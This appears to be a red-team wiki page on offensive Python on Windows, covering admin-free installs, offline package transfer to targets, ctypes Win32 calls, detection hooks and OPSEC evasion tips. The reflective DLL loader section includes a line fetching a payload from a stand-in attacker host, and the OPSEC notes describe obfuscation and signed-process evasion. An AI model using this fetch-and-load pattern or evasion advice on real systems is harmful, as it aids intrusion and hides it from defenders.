---
title: Offensive Python
permalink: /wiki/concepts/offensive-python/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/concepts/offensive-python/
---

**Category:** Execution / Defense Evasion
**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python
**Related:** [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Notepadplusplus Abuse](/wiki/concepts/notepadplusplus-abuse/), [Post Exploitation](/wiki/concepts/post-exploitation/)

## Overview
Python on Windows is an underutilized attack platform. It installs without admin rights via the Microsoft Store, runs inside signed Microsoft binaries (`python.exe`), creates inherently unusual memory patterns that defeat behavior-based baselines, and supports full Win32 API access via `ctypes`. Combined with offline package management, Python provides a practical execution environment even in air-gapped or restricted corporate environments.

## Installing Python Without Admin Rights

### Microsoft Store (GUI)
```
# Open Microsoft Store → search Python → click "Get"
# No admin required for MS Store apps
# Installed to: C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\
# Binary: PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\python3.13.exe

# Trigger via Store protocol handler (no browser needed):
ms-windows-store://pdp/?ProductId=9pnrbtzxmb4z
```

### Offline Installation (No Store Access)
```
1. On internet-connected system: open Store page in browser
2. Paste URL into https://store.rg-adguard.net/ → download MSIX/APPXBundle
3. Transfer installer to target
4. Install (no admin required):
   - Double-click MSIX → AppInstaller.exe prompt
   - PowerShell: Add-AppxPackage -Path python.msix
5. dism.exe requires admin; skip it

# Predict install path without installing:
# C:\Users\[user]\AppData\Local\Microsoft\WindowsApps\[Company].[App]_[publisher_id]\[exe].exe
```

## Offline Package Management

### When PyPI is Blocked
```bash
# On attacker machine with pip:
python offline_downloader.py --package impacket
# OR
python offline_downloader.py --requirements requirements.txt
# Creates packages.zip with all wheels + dependencies (recursive)

# Transfer packages.zip to target, then on target:
python offline_installer.py --package-zip packages.zip
# Installs all wheels using pip wheel format — no network needed
```

Useful tools with offline package support: `impacket`, `ldap3`, `pycryptodome`, `aiohttp`.

## Standard Library Capabilities

Python's standard library covers most attacker needs without external packages:

| Capability | Module |
|------------|--------|
| HTTP/HTTPS requests | `urllib` |
| TCP connections | `socket` |
| Hashing (SHA256, MD5) | `hashlib` |
| Compression | `gzip`, `zlib`, `zipfile` |
| **Win32 API calls** | **`ctypes`** |
| Spawn processes | `subprocess` |
| JSON/XML parsing | `json`, `xml` |
| Windows Registry | `winreg` |
| Base64 encode/decode | `base64` |
| IP address math | `ipaddress` |

Third-party for advanced use:

| Capability | Package |
|------------|---------|
| AES encryption | `pycryptodome` |
| WebSocket C2 | `aiohttp` |
| CLR/C# interop | `pythonnet` |
| Packet capture | `libpcap` |
| LDAP queries | `ldap3` |
| Windows protocols | `impacket` |

## ctypes for Win32 API Calls

`ctypes` is the Python equivalent of C# PInvoke. Load DLLs, call exported functions, perform real pointer operations.

### Pattern
```python
import ctypes
from ctypes import wintypes

# 1. Load DLL
kernel32 = ctypes.windll.kernel32
user32   = ctypes.windll.user32
custom   = ctypes.CDLL(r"C:\path\custom.dll")  # by path

# 2. Get function handle
CreateFileW = kernel32.CreateFileW

# 3. Define prototype
CreateFileW.argtypes = [
    wintypes.LPCWSTR,   # lpFileName
    wintypes.DWORD,     # dwDesiredAccess
    wintypes.DWORD,     # dwShareMode
    wintypes.LPVOID,    # lpSecurityAttributes
    wintypes.DWORD,     # dwCreationDisposition
    wintypes.DWORD,     # dwFlagsAndAttributes
    wintypes.HANDLE     # hTemplateFile
]
CreateFileW.restype = wintypes.HANDLE

# 4. Call
GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
CREATE_ALWAYS = 2
FILE_ATTRIBUTE_NORMAL = 0x80

handle = CreateFileW("test.txt", GENERIC_READ | GENERIC_WRITE,
                     0, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None)
```

### Full Example: MessageBox via ctypes
```python
import ctypes
from ctypes import c_char_p, c_uint32, c_void_p, create_string_buffer
import os.path

MAX_PATH = 260
kernel32 = ctypes.windll.kernel32
user32   = ctypes.windll.user32

GetCurrentProcessId = kernel32.GetCurrentProcessId
GetCurrentProcessId.restype = c_uint32
GetCurrentProcessId.argtypes = []

GetModuleFileNameA = kernel32.GetModuleFileNameA
GetModuleFileNameA.restype = c_uint32
GetModuleFileNameA.argtypes = [c_void_p, ctypes.c_char_p, c_uint32]

MessageBoxA = user32.MessageBoxA
MessageBoxA.restype  = ctypes.c_int32
MessageBoxA.argtypes = [c_void_p, c_char_p, c_char_p, c_uint32]

pid = GetCurrentProcessId()
buf = create_string_buffer(MAX_PATH)
kernel32.GetModuleFileNameA(None, buf, MAX_PATH)
name = os.path.basename(buf.value.decode('ascii'))

MessageBoxA(None, f"Process: {name}\nPID: {pid}".encode(),
            b"Info", 0x40)
```

### Reflective DLL Loader
The same `ctypes` pattern enables loading a DLL from a memory buffer (no disk write):
```python
# Simplified concept:
import ctypes, urllib.request

dll_bytes = urllib.request.urlopen("http://attacker.com/payload.dll").read()
buf = ctypes.create_string_buffer(dll_bytes)
# ... manual PE parsing + VirtualAlloc + memcpy + DllMain call
# Full implementation: https://gitlab.com/-/snippets/4786803
```

## IOC Profile of python.exe

**Why it evades detection:**
- `python.exe` is signed by Microsoft and Python Software Foundation
- Legitimate in enterprise environments — data science, DevOps, scripting
- Creates RWX memory and unbacked executable sections by default (before any malicious code runs — this is normal Python JIT/interpreter behavior)
- Baseline of "normal" python.exe network activity is unclear — it connects to PyPI, APIs, cloud storage regularly

**Detection hooks that do work:**
- `python.exe` spawning `cmd.exe` or `powershell.exe` — unusual
- `python.exe` connecting to attacker infrastructure (known-bad IPs/domains)
- `python.exe` in unusual paths (AppData, temp directories)
- Behavioral: process hollowing / injection from python context, reading LSASS

## OPSEC Notes
- Use standard library to avoid pip installs that generate network traffic
- Use `urllib` not `requests` (reduces non-standard package footprint)
- Store scripts as `.pyc` or obfuscate to reduce static detection
- Running from MS Store path gives signed binary execution context
- Consider running payloads inside Notepad++ PythonScript (signed loader process) — see [Notepadplusplus Abuse](/wiki/concepts/notepadplusplus-abuse/)

## References
- TrustedSec — "Operating Inside the Interpreted: Offensive Python" (2025-01-23)
- Pyramid framework — github.com/naksyn/Pyramid
- Chris Truncer — Veil Evasion (2013, original Python malware framework)
- Turla IronNetInjector — Python in .NET
